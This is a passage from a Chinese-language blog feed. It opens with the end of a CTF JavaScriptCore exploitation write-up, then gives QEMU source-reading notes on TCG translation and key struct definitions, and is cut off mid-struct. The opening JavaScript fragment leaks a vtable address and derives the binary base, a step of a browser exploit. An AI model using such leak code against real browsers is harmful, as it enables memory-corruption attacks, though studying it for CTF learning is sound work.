alt="Snipaste_2019-01-27_12-38-28.png-97.9kB"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info = info + <span class="string">"BKPStore vetable address : "</span> + store1.get(idx - <span class="number">6</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Undefined : "</span>+ store1.get(idx - <span class="number">5</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Type and aligement : "</span> + store1.get(idx - <span class="number">4</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Varvect : "</span> + store1.get(idx - <span class="number">3</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Intvect : "</span> + store1.get(idx - <span class="number">2</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Strvect : "</span> + store1.get(idx - <span class="number">1</span>).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">info = info + <span class="string">"Store_ping: "</span> + store1.get(idx).toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span></span><br><span class="line"><span class="keyword">var</span> binary_base = store1.get(idx <span class="number">-6</span>) - <span class="number">0x210400</span>;</span><br><span class="line">info = info + <span class="string">"Binary_base is : "</span> + binary_base.toString(<span class="number">16</span>) + <span class="string">"&lt;br&gt;"</span></span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/dane909/scscvg3dlicmvvet6hbc77hn/Snipaste_2019-01-27_13-17-52.png" alt="Snipaste_2019-01-27_13-17-52.png-153.1kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直在看 &lt;code&gt;webkit&lt;/code&gt;，可是一点进展都没有，很多还是看不懂，感觉 &lt;code&gt;webkit&lt;/code&gt; 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 &lt;code&gt;Javascriptcore&lt;/code&gt; 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。&lt;br&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://vsane.github.io/tags/ctf/"/>
    
      <category term="browser" scheme="https://vsane.github.io/tags/browser/"/>
    
  </entry>
  
  <entry>
    <title>QEMU部分源码阅读</title>
    <link href="https://vsane.github.io/2019/01/09/QEMU-shadowstack/"/>
    <id>https://vsane.github.io/2019/01/09/QEMU-shadowstack/</id>
    <published>2019-01-09T09:03:43.000Z</published>
    <updated>2019-01-09T09:19:16.073Z</updated>
    
    <content type="html"><![CDATA[<p>从备份失败的老博客还原出来的<br><a id="more"></a></p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p><code>Qemu</code> 通过 <code>TCG</code>翻译引擎(可以理解为编译器)将每条 <code>target</code> 指令动态翻译成 <code>TCG</code> 微操作码(前端)，然后再转换成对应的 <code>houst</code> 的指令来实现仿真(后端)。<code>Qemu</code> 代码翻译流程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target instruction -&gt;micro-op-&gt;tcg-&gt;host instruction</span><br></pre></td></tr></table></figure></p><p><code>qemu</code> 仿真的大致流程图如下:<br><img src="http://static.zybuluo.com/dane909/ttamjmhxmda7urdodc82zq27/2012-12-30-3.png" alt="2012-12-30-3.png-111.6kB"></p><h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><blockquote><ul><li>vl.c                              模拟循环，虚拟机机器环境初始化，和CPU的执行。</li><li>target-arch/translate.c    将guest代码转化成不同架构的TCG操作码。</li><li>tcg/tcg.c                  TCG操作码的实现</li><li>tcg-arch/tcg-target.c      将TCG操作码转化成对应的主机代码</li><li>cpu-exec.c                    其中的cpu-exec()函数主要寻找下一个TB（翻译代码块），如果没找到就请求得到下一个TB，并且操作生成的代码块。</li></ul></blockquote><h2 id="TCG-执行流程"><a href="#TCG-执行流程" class="headerlink" title="TCG 执行流程"></a>TCG 执行流程</h2><h3 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h3><p>以 <code>TB</code> 为单位读入当前 <code>pc</code> 指向的 <code>guest code</code><br><img src="http://static.zybuluo.com/dane909/grlyy9d2evjqjbpkgkskjofx/image_thumb1.png" alt="image_thumb1.png-28.1kB"></p><h3 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h3><p>生成对应的 <code>TCG</code> 操作码并优化，最后转化为 <code>host code</code><br><img src="http://static.zybuluo.com/dane909/lpabou8gqkjvqi0d5tc90oq1/image_thumb2.png" alt="image_thumb2.png-36.3kB"><br><img src="http://static.zybuluo.com/dane909/vb3fzvyjrni3fbpae04uqs01/image_thumb3.png" alt="image_thumb3.png-41.1kB"></p><h2 id="TB-Cache"><a href="#TB-Cache" class="headerlink" title="TB Cache"></a>TB Cache</h2><p><code>TB Cache</code> 的应用使 <code>translate code</code> 可以进行重用，减少了 <code>guest code</code> 与 <code>QEMU Translation Code</code> 之间的切换, 提高了 <code>QEMU</code> 的性能。</p><h2 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h2><h3 id="TCGContext"><a href="#TCGContext" class="headerlink" title="TCGContext"></a>TCGContext</h3><p>存放 <code>TCG IR</code> 的结构。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TCGContext</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *pool_cur, *pool_end;</span><br><span class="line">    TCGPool *pool_first, *pool_current, *pool_first_large;</span><br><span class="line">    <span class="keyword">int</span> nb_labels;</span><br><span class="line">    <span class="keyword">int</span> nb_globals;</span><br><span class="line">    <span class="keyword">int</span> nb_temps;</span><br><span class="line">    <span class="keyword">int</span> nb_indirects;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* goto_tb support */</span></span><br><span class="line">    tcg_insn_unit *code_buf;</span><br><span class="line">    <span class="keyword">uint16_t</span> *tb_jmp_reset_offset; <span class="comment">/* tb-&gt;jmp_reset_offset */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> *tb_jmp_insn_offset; <span class="comment">/* tb-&gt;jmp_insn_offset if USE_DIRECT_JUMP */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> *tb_jmp_target_addr; <span class="comment">/* tb-&gt;jmp_target_addr if !USE_DIRECT_JUMP */</span></span><br><span class="line"></span><br><span class="line">    TCGRegSet reserved_regs;   <span class="comment">//寄存器</span></span><br><span class="line">    <span class="keyword">intptr_t</span> current_frame_offset;</span><br><span class="line">    <span class="keyword">intptr_t</span> frame_start;</span><br><span class="line">    <span class="keyword">intptr_t</span> frame_end;</span><br><span class="line">    TCGTemp *frame_temp;</span><br><span class="line"></span><br><span class="line">    tcg_insn_unit *code_ptr;</span><br><span class="line"></span><br><span class="line">    GHashTable *helpers;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROFILER</span></span><br><span class="line">    <span class="comment">/* profiling info */</span></span><br><span class="line">    <span class="keyword">int64_t</span> tb_count1;</span><br><span class="line">    <span class="keyword">int64_t</span> tb_count;</span><br><span class="line">    <span class="keyword">int64_t</span> op_count; <span class="comment">/* total insn count */</span></span><br><span class="line">    <span class="keyword">int</span> op_count_max; <span class="comment">/* max insn per TB */</span></span><br><span class="line">    <span class="keyword">int64_t</span> temp_count;</span><br><span class="line">    <span class="keyword">int</span> temp_count_max;</span><br><span class="line">    <span class="keyword">int64_t</span> del_op_count;</span><br><span class="line">    <span class="keyword">int64_t</span> code_in_len;</span><br><span class="line">    <span class="keyword">int64_t</span> code_out_len;</span><br><span class="line">    <span class="keyword">int64_t</span> search_out_len;</span><br><span class="line">    <span class="keyword">int64_t</span> interm_time;</span><br><span class="line">    <span class="keyword">int64_t</span> code_time;</span><br><span class="line">    <span class="keyword">int64_t</span> la_time;</span><br><span class="line">    <span class="keyword">int64_t</span> opt_time;</span><br><span class="line">    <span class="keyword">int64_t</span> restore_count;</span><br><span class="line">    <span class="keyword">int64_t</span> restore_time;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_TCG</span></span><br><span class="line">    <span class="keyword">int</span> temps_in_use;</span><br><span class="line">    <span class="keyword">int</span> goto_tb_issue_mask;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> gen_next_op_idx;</span><br><span class="line">    <span class="keyword">int</span> gen_next_parm_idx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Code generation.  Note that we specifically do not use tcg_insn_unit</span></span><br><span class="line"><span class="comment">       here, because there's too much arithmetic throughout that relies</span></span><br><span class="line"><span class="comment">       on addition and subtraction working on bytes.  Rely on the GCC</span></span><br><span class="line"><span class="comment">       extension that allows arithmetic on void*.  */</span></span><br><span class="line">    <span class="keyword">int</span> code_gen_max_blocks;</span><br><span class="line">    <span class="keyword">void</span> *code_gen_prologue;  <span class="comment">//指向缓冲区的prologue</span></span><br><span class="line">    <span class="keyword">void</span> *code_gen_buffer;   <span class="comment">//翻译后的指令缓冲区</span></span><br><span class="line">    <span class="keyword">size_t</span> code_gen_buffer_size; <span class="comment">//翻译后指令缓冲区的大小</span></span><br><span class="line">    <span class="keyword">void</span> *code_gen_ptr; <span class="comment">//指向翻译后的指令缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Threshold to flush the translated code buffer.  */</span></span><br><span class="line">    <span class="keyword">void</span> *code_gen_highwater;</span><br><span class="line"></span><br><span class="line">    TBContext tb_ctx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Track which vCPU triggers events */</span></span><br><span class="line">    CPUState *cpu;                      <span class="comment">/* *_trans  cpu状态*/</span></span><br><span class="line">    TCGv_env tcg_env;                   <span class="comment">/* *_exec  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The TCGBackendData structure is private to tcg-target.inc.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TCGBackendData</span> *<span class="title">be</span>;</span></span><br><span class="line"></span><br><span class="line">    TCGTempSet free_temps[TCG_TYPE_COUNT * <span class="number">2</span>];</span><br><span class="line">    TCGTemp temps[TCG_MAX_TEMPS]; <span class="comment">/* globals first, temps after */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tells which temporary holds a given register.</span></span><br><span class="line"><span class="comment">       It does not take into account fixed registers */</span></span><br><span class="line">    TCGTemp *reg_to_temp[TCG_TARGET_NB_REGS]; <span class="comment">//临时寄存器变量</span></span><br><span class="line"></span><br><span class="line">    TCGOp gen_op_buf[OPC_BUF_SIZE];  <span class="comment">//操作码缓冲区</span></span><br><span class="line">    TCGArg gen_opparam_buf[OPPARAM_BUF_SIZE]; <span class="comment">//参数缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> gen_insn_end_off[TCG_MAX_INSNS];</span><br><span class="line">    target_ulong gen_insn_data[TCG_MAX_INSNS][TARGET_INSN_START_WORDS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="DisasContext"><a href="#DisasContext" class="headerlink" title="DisasContext"></a>DisasContext</h3><p>应该可以理解为反编译 <code>guest</code> 需要的一些信息<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DisasContext</span> &#123;</span></span><br><span class="line">    <span class="comment">/* current insn context */</span></span><br><span class="line">    <span class="keyword">int</span> override; <span class="comment">/* -1 if no override */</span></span><br><span class="line">    <span class="keyword">int</span> prefix;</span><br><span class="line">    TCGMemOp aflag;</span><br><span class="line">    TCGMemOp dflag;</span><br><span class="line">    target_ulong pc_start;</span><br><span class="line">    target_ulong pc; <span class="comment">/* pc = eip + cs_base */</span></span><br><span class="line">    <span class="keyword">int</span> is_jmp; <span class="comment">/* 1 = means jump (stop translation), 2 means CPU</span></span><br><span class="line"><span class="comment">                   static state change (stop translation) */</span></span><br><span class="line">    <span class="comment">/* current block context */</span></span><br><span class="line">    target_ulong cs_base; <span class="comment">/* base of CS segment */</span></span><br><span class="line">    <span class="keyword">int</span> pe;     <span class="comment">/* protected mode */</span></span><br><span class="line">    <span class="keyword">int</span> code32; <span class="comment">/* 32 bit code segment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TARGET_X86_64</span></span><br><span class="line">    <span class="keyword">int</span> lma;    <span class="comment">/* long mode active */</span></span><br><span class="line">    <span class="keyword">int</span> code64; <span class="comment">/* 64 bit code segment */</span></span><br><span class="line">    <span class="keyword">int</span> rex_x, rex_b;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> vex_l;  <span class="comment">/* vex vector length */</span></span><br><span class="line">    <span class="keyword">int</span> vex_v;  <span class="comment">/* vex vvvv register, without 1's compliment.  */</span></span><br><span class="line">    <span class="keyword">int</span> ss32;   <span class="comment">/* 32 bit stack segment */</span></span><br><span class="line">    CCOp cc_op;  <span class="comment">/* current CC operation */</span></span><br><span class="line">    <span class="keyword">bool</span> cc_op_dirty;</span><br><span class="line">    <span class="keyword">int</span> addseg; <span class="comment">/* non zero if either DS/ES/SS have a non zero base */</span></span><br><span class="line">    <span class="keyword">int</span> f_st;   <span class="comment">/* currently unused */</span></span><br><span class="line">    <span class="keyword">int</span> vm86;   <span class="comment">/* vm86 mode */</span></span><br><span class="line">    <span class="keyword">int</span> cpl;</span><br><span class="line">    <span class="keyword">int</span> iopl;</span><br><span class="line">    <span class="keyword">int</span> tf;     <span class="comment">/* TF cpu flag */</span></span><br><span class="line">    <span class="keyword">int</span> singlestep_enabled; <span class="comment">/* "hardware" single step enabled */</span></span><br><span class="line">    <span class="keyword">int</span> jmp_opt; <span class="comment">/* use direct block chaining for direct jumps */</span></span><br><span class="line">    <span class="keyword">int</span> repz_opt; <span class="comment">/* optimize jumps within repz instructions */</span></span><br><span class="line">    <span class="keyword">int</span> mem_index; <span class="comment">/* select memory access functions */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> flags; <span class="comment">/* all execution flags */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TranslationBlock</span> *<span class="title">tb</span>;</span></span><br><span class="line">    <span class="keyword">int</span> popl_esp_hack; <span class="comment">/* for correct popl with esp base handling */</span></span><br><span class="line">    <span class="keyword">int</span> rip_offset; <span class="comment">/* only used in x86_64, but left for simplicity */</span></span><br><span class="line">    <span class="keyword">int</span> cpuid_features;</span><br><span class="line">    <span class="keyword">int</span> cpuid_ext_features;</span><br><span class="line">    <span class="keyword">int</span> cpuid_ext2_features;</span><br><span class="line">    <span class="keyword">int</span> cpuid_ext3_features;</span><br><span class="line">    <span class="keyword">int</span> cpuid_7_0_ebx_features;</span><br><span class="line">    <span class="keyword">int</span> cpuid_xsave_features;</span><br><span class="line">&#125; DisasContext;</span><br></pre></td></tr></table></figure></p><h3 id="CPUState"><a href="#CPUState" class="headerlink" title="CPUState"></a>CPUState</h3><p><code>cpu</code> 相关信息的记录<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CPUState:</span></span><br><span class="line"><span class="comment"> * @cpu_index: CPU index (informative).</span></span><br><span class="line"><span class="comment"> * @nr_cores: Number of cores within this CPU package.</span></span><br><span class="line"><span class="comment"> * @nr_threads: Number of threads within this CPU.</span></span><br><span class="line"><span class="comment"> * @numa_node: NUMA node this CPU is belonging to.</span></span><br><span class="line"><span class="comment"> * @host_tid: Host thread ID.</span></span><br><span class="line"><span class="comment"> * @running: #true if CPU is currently running (usermode).</span></span><br><span class="line"><span class="comment"> * @created: Indicates whether the CPU thread has been successfully created.</span></span><br><span class="line"><span class="comment"> * @interrupt_request: Indicates a pending interrupt request.</span></span><br><span class="line"><span class="comment"> * @halted: Nonzero if the CPU is in suspended state.</span></span><br><span class="line"><span class="comment"> * @stop: Indicates a pending stop request.</span></span><br><span class="line"><span class="comment"> * @stopped: Indicates the CPU has been artificially stopped.</span></span><br><span class="line"><span class="comment"> * @unplug: Indicates a pending CPU unplug request.</span></span><br><span class="line"><span class="comment"> * @crash_occurred: Indicates the OS reported a crash (panic) for this CPU</span></span><br><span class="line"><span class="comment"> * @tcg_exit_req: Set to force TCG to stop executing linked TBs for this</span></span><br><span class="line"><span class="comment"> *           CPU and return to its top level loop.</span></span><br><span class="line"><span class="comment"> * @tb_flushed: Indicates the translation buffer has been flushed.</span></span><br><span class="line"><span class="comment"> * @singlestep_enabled: Flags for single-stepping.</span></span><br><span class="line"><span class="comment"> * @icount_extra: Instructions until next timer event.</span></span><br><span class="line"><span class="comment"> * @icount_decr: Number of cycles left, with interrupt flag in high bit.</span></span><br><span class="line"><span class="comment"> * This allows a single read-compare-cbranch-write sequence to test</span></span><br><span class="line"><span class="comment"> * for both decrementer underflow and exceptions.</span></span><br><span class="line"><span class="comment"> * @can_do_io: Nonzero if memory-mapped IO is safe. Deterministic execution</span></span><br><span class="line"><span class="comment"> * requires that IO only be performed on the last instruction of a TB</span></span><br><span class="line"><span class="comment"> * so that interrupts take effect immediately.</span></span><br><span class="line"><span class="comment"> * @cpu_ases: Pointer to array of CPUAddressSpaces (which define the</span></span><br><span class="line"><span class="comment"> *            AddressSpaces this CPU has)</span></span><br><span class="line"><span class="comment"> * @num_ases: number of CPUAddressSpaces in @cpu_ases</span></span><br><span class="line"><span class="comment"> * @as: Pointer to the first AddressSpace, for the convenience of targets which</span></span><br><span class="line"><span class="comment"> *      only have a single AddressSpace</span></span><br><span class="line"><span class="comment"> * @env_ptr: Pointer to subclass-specific CPUArchState field.</span></span><br><span class="line"><span class="comment"> * @gdb_regs: Additional GDB registers.</span></span><br><span class="line"><span class="comment"> * @gdb_num_regs: Number of total registers accessible to GDB.</span></span><br><span class="line"><span class="comment"> * @gdb_num_g_regs: Number of registers in GDB 'g' packets.</span></span><br><span class="line"><span class="comment"> * @next_cpu: Next CPU sharing TB cache.</span></span><br><span class="line"><span class="comment"> * @opaque: User data.</span></span><br><span class="line"><span class="comment"> * @mem_io_pc: Host Program Counter at which the memory was accessed.</span></span><br><span class="line"><span class="comment"> * @mem_io_vaddr: Target virtual address at which the memory was accessed.</span></span><br><span class="line"><span class="comment"> * @kvm_fd: vCPU file descriptor for KVM.</span></span><br><span class="line"><span class="comment"> * @work_mutex: Lock to prevent multiple access to queued_work_*.</span></span><br><span class="line"><span class="comment"> * @queued_work_first: First asynchronous work pending.</span></span><br><span class="line"><span class="comment"> * @trace_dstate: Dynamic tracing state of events for this vCPU (bitmask).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * State of one CPU core or thread.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CPUState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    DeviceState parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nr_cores;</span><br><span class="line">    <span class="keyword">int</span> nr_threads;</span><br><span class="line">    <span class="keyword">int</span> numa_node;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QemuThread</span> *<span class="title">thread</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> thread_id;</span><br><span class="line">    <span class="keyword">uint32_t</span> host_tid;</span><br><span class="line">    <span class="keyword">bool</span> running;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QemuCond</span> *<span class="title">halt_cond</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> thread_kicked;</span><br><span class="line">    <span class="keyword">bool</span> created;</span><br><span class="line">    <span class="keyword">bool</span> stop;</span><br><span class="line">    <span class="keyword">bool</span> stopped;</span><br><span class="line">    <span class="keyword">bool</span> unplug;</span><br><span class="line">    <span class="keyword">bool</span> crash_occurred;</span><br><span class="line">    <span class="keyword">bool</span> exit_request;</span><br><span class="line">    <span class="keyword">bool</span> tb_flushed;</span><br><span class="line">    <span class="keyword">uint32_t</span> interrupt_request;</span><br><span class="line">    <span class="keyword">int</span> singlestep_enabled;</span><br><span class="line">    <span class="keyword">int64_t</span> icount_extra;</span><br><span class="line">    sigjmp_buf jmp_env;</span><br><span class="line"></span><br><span class="line">    QemuMutex work_mutex;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qemu_work_item</span> *<span class="title">queued_work_first</span>, *<span class="title">queued_work_last</span>;</span></span><br><span class="line"></span><br><span class="line">    CPUAddressSpace *cpu_ases;</span><br><span class="line">    <span class="keyword">int</span> num_ases;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">    MemoryRegion *memory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *env_ptr; <span class="comment">/* CPUArchState */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TranslationBlock</span> *<span class="title">tb_jmp_cache</span>[<span class="title">TB_JMP_CACHE_SIZE</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">GDBRegisterState</span> *<span class="title">gdb_regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> gdb_num_regs;</span><br><span class="line">    <span class="keyword">int</span> gdb_num_g_regs;</span><br><span class="line">    QTAILQ_ENTRY(CPUState) node;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ice debug support */</span></span><br><span class="line">    QTAILQ_HEAD(breakpoints_head, CPUBreakpoint) breakpoints;</span><br><span class="line"></span><br><span class="line">    QTAILQ_HEAD(watchpoints_head, CPUWatchpoint) watchpoints;</span><br><span class="line">    CPUWatchpoint *watchpoint_hit;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In order to avoid passing too many arguments to the MMIO helpers,</span></span><br><span class="line"><span class="comment">     * we store some rarely used information in the CPU context.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> mem_io_pc;</span><br><span class="line">    vaddr mem_io_vaddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> kvm_fd;</span><br><span class="line">    <span class="keyword">bool</span> kvm_vcpu_dirty;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">KVMState</span> *<span class="title">kvm_state</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">kvm_run</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used for events with 'vcpu' and *without* the 'disabled' properties */</span></span><br><span class="line">    DECLARE_BITMAP(trace_dstate, TRACE_VCPU_EVENT_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* TODO Move common fields from CPUArchState here. */</span></span><br><span class="line">    <span class="keyword">int</span> cpu_index; <span class="comment">/* used by alpha TCG */</span></span><br><span class="line">    <span 